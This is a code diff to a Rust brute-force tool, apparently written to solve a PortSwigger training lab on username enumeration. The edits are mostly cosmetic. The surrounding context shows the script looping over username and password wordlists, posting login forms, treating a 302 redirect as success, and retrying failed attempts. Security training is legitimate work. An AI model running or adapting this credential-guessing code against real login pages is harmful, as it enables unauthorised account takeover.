@@ -6,8 +6,8 @@
 *
 * PortSwigger LAB: Username enumeration via different responses
 *
-* Steps: 1. enum usernames to get a valid one
-*        2. brute force the valid username password
+* Steps: 1. Enum usernames to get a valid one
+*        2. Brute force the valid username password
 *
 *****************************************************************/
 #![allow(unused)]
@@ -64,13 +64,11 @@ fn main() {
 
     let usernames_big_string = fs::read_to_string("/home/ahmed/users").unwrap();
     // change the path to ure usrenames list
-    // let usernames_big_string = fs::read_to_string("/home/ahmed/dark_users_100000.txt").unwrap();
-    let usernames = usernames_big_string.split("\n").collect();
+    let usernames = usernames_big_string.split("\n").collect(); // change split to \r\n if you are still a windows user
 
     let passwords_big_string = fs::read_to_string("/home/ahmed/passwords").unwrap();
     // change the path to ure passwords list
-    // let passwords_big_string = fs::read_to_string("/home/ahmed/dark_passwords_100000.txt").unwrap();
-    let passwords = passwords_big_string.split("\n").collect();
+    let passwords = passwords_big_string.split("\n").collect(); // change split to \r\n if you are still a windows user
 
     let start_time = time::Instant::now(); // capture the time before brute forcing
 
@@ -100,7 +98,7 @@ fn main() {
     }
     print_finish_message(start_time); // print finish time
     print_failed_requests(); // some request will be failed due to unknow reseaon; print them after you finish to try them latere
-    save_results(start_time, "results"); // save resultes to a file in the current working directory
+    save_results(start_time, "results"); // save resultes to a file in the current working directory. you can change this name to what you want
 }
 
 /*******************************************************************
@@ -214,7 +212,7 @@ fn brute_force_password(
     println!("");
     println!(
         "{}: {}",
-        "✅ Valid user: ".white().bold(),
+        "✅ Valid user".white().bold(),
         valid_user.green().bold()
     );
     println!("\n[#] Brute forcing password..");
@@ -249,7 +247,7 @@ fn brute_force_password(
                         VALID_PASSWORD.lock().unwrap().push_str(password) // update the global variable to the valid password; this is a thread-safe operation using mutexes
                     }
                 } else {
-                    // if the request faild for unkonw reason try to send it again
+                    // if the request faild for unknown reason try to send it again
                     login = client.post(url).form(&data).send();
                     if let Ok(res) = login {
                         if res.status().as_u16() == 302 {
@@ -300,7 +298,7 @@ fn print_progress(
 *********************************************************/
 fn print_valid_credentials() {
     println!(
-        "\n{}: username: {},password: {}",
+        "\n{}: username: {}, password: {}",
         "✅ Login successfully".white(),
         VALID_USER.lock().unwrap().green().bold(),
         VALID_PASSWORD.lock().unwrap().green().bold()
@@ -313,7 +311,7 @@ fn print_valid_credentials() {
 fn print_finish_message(start_time: Instant) {
     println!(
         "\n{}: {:?} minutes",
-        "✅ Finished in: ".green().bold(),
+        "✅ Finished in".green().bold(),
         start_time.elapsed().as_secs() / 60
     );
 }
@@ -328,7 +326,7 @@ fn print_failed_requests() {
         "\n\n{}: {} \n{}: {:?}",
         "[!] Failed users count".red().bold(),
         failed_users.len().to_string().yellow().bold(),
-        "[!] Failed users ".red().bold(),
+        "[!] Failed users".red().bold(),
         failed_users
     );
     let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
@@ -336,7 +334,7 @@ fn print_failed_requests() {
         "\n\n{}: {} \n{}: {:?}",
         "[!] Failed password count".red().bold(),
         failed_passwords.len().to_string().yellow().bold(),
-        "[!] Failed password ".red().bold(),
+        "[!] Failed password".red().bold(),
         failed_passwords
     )
 }
@@ -352,9 +350,9 @@ fn save_results(start_time: Instant, file_name: &str) {
     let to_save = format!(
         "✅ Finished in: {elapsed_time:?} minutes \n\n\
     Username: {user}, Password: {pass} \n\n\
-    [!] Failed users count: {fusers_count} \n\n\
+    [!] Failed users count: {fusers_count} \n\
     [!] Failed users: {fusers:?} \n\n\
-    [!] Failed passwords count: {fpasswords_count} \n\n\
+    [!] Failed passwords count: {fpasswords_count} \n\
     [!] Failed passwords: {fpasswords:?} \n\n",
         elapsed_time = start_time.elapsed().as_secs() / 60,
         fusers_count = failed_users.len(),
